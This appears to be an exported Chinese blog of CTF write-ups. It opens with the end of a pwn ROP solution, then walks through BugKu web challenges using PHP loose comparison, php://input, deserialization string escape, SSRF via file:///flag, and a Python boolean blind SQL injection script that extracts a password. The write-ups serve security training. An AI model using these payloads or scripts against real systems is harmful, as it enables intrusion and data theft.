class="number">0x0000000000400963</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please leave a message(Within 0x200 Length):"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x210</span>-<span class="number">8</span>) + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(binsh_got) + p64(system_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，成功getshell；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210313163746.png" style="zoom:50%;"></li>
</ol>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>BugKu Web WP</title>
    <url>/BugKu-Web-WP.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理BugKuCTF中部分WEB题WriteUp；<span id="more"></span></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h2><ol>
<li><p>BurpSuite抓包发现<code>1p.html</code>文件；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210830210731.png" style="zoom:50%;"></li>
<li><p>URL查看<code>1p.html</code>，会跳转到<code>https://www.bugku.com/</code>，BurpSuite查看返回数据包内容如下：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">"Javascript"</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="comment">&lt;!--</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">            var Words ="%3Cscript%3Ewindow.location.href%3D'http%3A%2F%2Fwww.bugku.com'%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E" </span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">			function OutWord()</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">			{</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">                var NewWords;</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">                NewWords = unescape(Words);</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">                document.write(NewWords);</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">            } </span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">            OutWord();</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">            // --&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        </span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>发现变量words通过URL和Base64编码，进行多次解码操作，最终页面代码如下；</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">"Javascript"</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            &lt;!--</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> <span class="title class_">Words</span> =<span class="string">"&lt;script&gt;window.location.href='http://www.bugku.com';</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--";if(!$_GET['id'])</span></span><br><span class="line"><span class="comment">{</span></span><br><span class="line"><span class="comment">	header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="comment">	exit();</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment">$id=$_GET['id'];</span></span><br><span class="line"><span class="comment">$a=$_GET['a'];</span></span><br><span class="line"><span class="comment">$b=$_GET['b'];</span></span><br><span class="line"><span class="comment">if(stripos($a,'.'))</span></span><br><span class="line"><span class="comment">{</span></span><br><span class="line"><span class="comment">	echo 'no no no no no no no';</span></span><br><span class="line"><span class="comment">	return ;</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment">$data = @file_get_contents($a,'r');</span></span><br><span class="line"><span class="comment">if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="comment">{</span></span><br><span class="line"><span class="comment">	$flag = "flag{***********}"</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">{</span></span><br><span class="line"><span class="comment">	print "never never never give up !!!";</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">?&gt;--&gt;</span>" </span><br><span class="line">			function OutWord()</span><br><span class="line">			{</span><br><span class="line">                var NewWords;</span><br><span class="line">                NewWords = unescape(Words);</span><br><span class="line">                document.write(NewWords);</span><br><span class="line">            } </span><br><span class="line">            OutWord();</span><br><span class="line">            // --&gt;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>优化处理后分析如下代码；</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">'id'</span>])</span><br><span class="line">{</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">'.'</span>))</span><br><span class="line">{</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">"111"</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">{</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">"flag{***********}"</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>  要得到flag，需要满足以下要求：</p>
<ol>
<li>  id不能为空和<code>0</code>；</li>
<li>  只能通过GET获取id、a、b三个变量；</li>
<li>  a中不能出现<code>.</code>；</li>
<li>  a为数据流；（@file_get_contents()）</li>
<li>需要满足条件<code>$data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4</code><ol>
<li>  a数据流的内容为<code>bugku is a nice plateform!</code>；</li>
<li>  <code>id==0</code>；</li>
<li>  变量b的长度大于5；</li>
<li>  变量b的开头不能为4，并且<code>111</code>拼接字符串b的开头需要和<code>1114</code>正则匹配；</li>
</ol>
</li>
</ol>
</li>
<li><p>根据要求构造payload如下；</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /hello.php?id=0a&amp;a=php://input&amp;b=*12345 HTTP/1.1</span><br><span class="line">Host: 114.67.246.176:14705</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: Hm_lvt_c1b044f909411ac4213045f0478e96fc=1628766579; _ga=GA1.1.306268332.1628766580</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">bugku is a nice plateform!</span><br></pre></td></tr></table></figure>

<ul>
<li><p>  通过POST+PHP伪协议传递变量a；</p>
</li>
<li><p>  利用PHP的<strong>弱等于</strong>特性设置<code>id=0a</code>；</p>
</li>
<li><p>  利用<code>*</code>代表PHP正则的任意字符，绕过正则检验；</p>
</li>
</ul>
</li>
<li><p>知识点</p>
<ol>
<li><p>**stripos()**函数；</p>
<p>  strip() 函数用于查找字符串在另一字符串中第一次出现的位置（不区分大小写），返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE；</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">"hello"</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>, <span class="string">'o'</span>);</span><br><span class="line"><span class="comment"># 返回4</span></span><br></pre></td></tr></table></figure></li>
<li><p>PHP<strong>伪协议</strong>；</p>
<p>  PHP类型的网页需要通过GET传递数据流时，可采用<code>a=php://</code>PHP伪协议来访问输入输出的数据流，其中<code>php://input</code>可以访问原始请求数据中的只读流，在请求体中添加数据流内容；</p>
</li>
<li><p><strong>PHP弱等于</strong>；</p>
<p>  PHP有两种比较符号：</p>
<ol>
<li>  **<code>===</code>**在进行比较的时候，会先判断两种字符串的类型是否相等，再比较；</li>
<li>  **<code>==</code>**在进行比较的时候，会先将字符串转化成相同类型，再比较；</li>
</ol>
<p>  例如：</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">"admin"</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">"1admin"</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">"admin1"</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">"admin1"</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>**eregi()**函数；</p>
<p>  eregi()函数在一个字符串搜索指定的模式的字符串（不区分大小写），如果匹配成功返回true，否则返回false；</p>
<p>  PHP5可以使用，PHP7已经被弃用；</p>
<p>  eregi()函数存在截断漏洞，本题可以通过截断漏洞利用；</p>
<p>  可选的输入参数规则包含一个数组的所有匹配表达式，他们被正则表达式的括号分组；</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">eregi</span>(<span class="keyword">string</span> pattern, <span class="keyword">string</span> <span class="keyword">string</span>, [<span class="keyword">array</span> regs]);</span><br></pre></td></tr></table></figure>

  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$password</span> = <span class="string">"abc"</span>;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="title function_ invoke__">eregi</span> (<span class="string">"[[:alnum:]]{8,10}"</span>, <span class="variable">$password</span>)){</span><br><span class="line">       <span class="keyword">print</span> <span class="string">"Invalid password! Passwords must be from 8 - 10 chars"</span>;</span><br><span class="line">    } <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Valid password"</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 输出 Invalid password! Passwords must be from 8 - 10 chars</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="newphp"><a href="#newphp" class="headerlink" title="newphp"></a>newphp</h2><p>PHP代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php版本:5.4.44</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">"Content-type: text/html; charset=utf-8"</span>);	<span class="comment">//请求头</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);	<span class="comment">//高亮显示</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;	<span class="comment">//定义hint变量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span></span>)</span>{	<span class="comment">//构造函数，实现重载</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="variable">$hint</span>;	<span class="comment">//为hint赋初始值</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{	<span class="comment">//析构函数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;hint===<span class="string">"hint.php"</span>)</span><br><span class="line">            @<span class="variable language_">$this</span>-&gt;hint = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;hint)); <span class="comment">//读取hint.php内容，并进行base64编码</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;hint);	<span class="comment">//输出读取的内容</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>{ </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;hint != <span class="string">"╭(●｀∀´●)╯"</span>) { </span><br><span class="line">            <span class="comment">//There's a hint in ./hint.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">"╰(●’◡’●)╮"</span>; </span><br><span class="line">        } </span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>{</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;	<span class="comment">//定义全局变量tmp</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">'*'</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, <span class="variable">$data</span>);	<span class="comment">//将data中的'\0\0\0'替换为chr(0).'*'.chr(0)</span></span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$data</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>{</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">'\0\0\0'</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">'*'</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);	<span class="comment">//将data中的chr(0).'*'.chr(0)替换为'\0\0\0'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">"test"</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];	<span class="comment">//post传递username</span></span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];	<span class="comment">//post传递password</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));	<span class="comment">//序列化</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">'/flag/is'</span>,<span class="variable">$a</span>))	<span class="comment">//变量a进行正则表达式匹配</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"NoNoNo!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="variable">$a</span>)));	<span class="comment">//反序列化</span></span><br></pre></td></tr></table></figure>

<ol>
<li>  使用反序列化调用eval类，输出base64编码的<code>hint.php</code>的内容；</li>
<li>  可控参数只有<code>username</code>和<code>password</code>；</li>
<li>需要利用PHP反序列化字符串逃逸特性：<ol>
<li>  PHP 在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>}</code>作为结尾(字符串除外)，并且是根据长度判断内容的；</li>
<li>  对类中不存在的属性也会进行反序列化；</li>
<li>  序列化的字符串在经过过滤函数不正确的处理后可能导致对象注入；</li>
</ol>
</li>
<li>  利用该特性添加一个<code>hint</code>属性，使该值为<code>hint.php</code>；</li>
<li>  利用<code>\0\0\0</code>对序列化的字符串长度进行缩短；</li>
<li>  绕过evil的wakeup函数；</li>
</ol>
<p>具体步骤：</p>
<ol>
<li><p>获取绕过evil的wakeup函数的序列化内容：</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>{</span><br><span class="line">    	<span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">"hint.php"</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">'":1:'</span>,<span class="string">'":2:'</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<p>  得到<code>O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}</code></p>
</li>
<li><p>利用字符串逃逸进行拼接，user类触发的payload为<code>O:4:"User":2:{s:8:"username";s:3:"111";s:8:"password";s:41:"O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}";}</code>，</p>
<p>  需要替换掉<code>";s:8:"password";s:3:"1</code>，共23位；</p>
</li>
<li><p>  而每次添加一组<code>\0\0\0</code>能多吞掉3个字符，需要3的倍数，可以在<code>password</code>的值上加一个任意字符，即可凑齐24个字符，构造payload为<code> username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";}</code>；</p>
</li>
<li><p>  将上述payload通过POST方式传递，获取Base64编码内容<code>string(68) "PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7CiAvLyBZb3UgY2FuJ3Qgc2VlIG1lfgo="</code></p>
</li>
<li><p>解码后，内容如下：</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">"index.cgi"</span>;</span><br><span class="line"> <span class="comment">// You can't see me~</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>index.cgi</code>文件，得到内容如下</p>
  <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"args"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Bob"</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">"headers"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"Accept"</span><span class="punctuation">:</span> <span class="string">"*/*"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"Host"</span><span class="punctuation">:</span> <span class="string">"httpbin.org"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"User-Agent"</span><span class="punctuation">:</span> <span class="string">"curl/7.64.0"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"X-Amzn-Trace-Id"</span><span class="punctuation">:</span> <span class="string">"Root=1-613634ac-1183acf448a560416c61e1fc"</span></span><br><span class="line">	<span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">"origin"</span><span class="punctuation">:</span> <span class="string">"114.67.246.176"</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">"url"</span><span class="punctuation">:</span> <span class="string">"http://httpbin.org/get?name=Bob"</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></table></figure></li>
<li><p>  分析上述代码，通过curl访问链接<code>http://httpbin.org/get?name=Bob</code>，更改name变量，返回内容有变化，存在SSRF漏洞；</p>
</li>
<li><p>  通过<code>file</code>协议，读取flag文件，payload为<code>?name= file:///flag</code>，可获取flag；</p>
</li>
</ol>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>基于布尔的SQL盲注；</p>
<ol>
<li><p>  打开页面是个登录界面，随便输入admin、password，显示密码错误，输入qwe、qwe显示用户不存在；</p>
</li>
<li><p>  根据提示“基于布尔的SQL盲注”，猜测服务端先判断username是否存在，再判断输入的密码是否正确，猜测username存在注入点；</p>
</li>
<li><p>  猜测后端验证username的语句为<code>select password,username from users where username="input"</code>；</p>
</li>
<li><p>如果在where语句的结尾加上一个and连接的布尔判断语句，就可以根据返回值判断where条件是否成立：<code>where username='admin' and (substring(database(),1,1)='a')</code></p>
<ol>
<li>  如果返回密码错误，则说明and后的语句成立；</li>
<li>  如果返回用户名不存在，则说明and后的语句不成立；</li>
</ol>
</li>
<li><p>  但是测试发现，返回值为非法字符，过滤了and；</p>
</li>
<li><p>  继续测试，发现过滤了空格、, 、+、=等，但是&lt;、&gt;、^、(、)、ascii、substr等用于盲注的函数都还在；</p>
</li>
<li><p>  空格可以使用括号代替，=可以使用&lt;&gt;代替，and可以使用异或运算代替（1^1=0 、 1^0=1 、0^0=0）；</p>
</li>
<li><p>编写脚本如下：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str_all=<span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/="</span></span><br><span class="line">url=<span class="string">"http://114.67.246.176:11566/index.php"</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>():</span><br><span class="line">    result=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_all:</span><br><span class="line">            payload = <span class="string">"admin'^(ascii(mid((select(password)from(admin))from({})))&lt;&gt;{})^0#"</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i+<span class="number">1</span>),<span class="built_in">ord</span>(j))</span><br><span class="line">            data = {</span><br><span class="line">                <span class="string">"username"</span>: payload,</span><br><span class="line">                <span class="string">"password"</span>: <span class="string">"abc"</span></span><br><span class="line">            }</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text:</span><br><span class="line">                result+=j</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"--------------------------------------------------------------"</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"result: "</span>,result)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"--------------------------------------------------------------"</span>)</span><br><span class="line">        <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password()</span><br></pre></td></tr></table></figure></li>
<li><p>对于payload内容<code>admin'^(ascii(mid((select(password)from(admin))from({})))&lt;&gt;{})^0#</code></p>
<ol>
<li>  <code>&lt;&gt;</code>代替<code>=</code>，括号代替空格；</li>
<li>  mid()函数和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx,from 1 for 1)但是这里过滤了for和逗号。因此，这里用到了ascii()取ascii码值，如果传入一个字符串那么就会取第一个字符的ascii码值，起到了for的作用，并且mid()函数是可以只写from的表示从第几位往后的字符串，将取出的字符串在传入ascii()中取第一位，就完成了对单个字符的提取；</li>
<li>  每个字符的ascii码判断，是否不等于给定的数字，会得到一个布尔值(0或1)再与结尾的0进行运算，如果数据库名的第一位的ascii码值不是97，where条件是<code>username='admin'^1^0</code>；</li>
</ol>
</li>
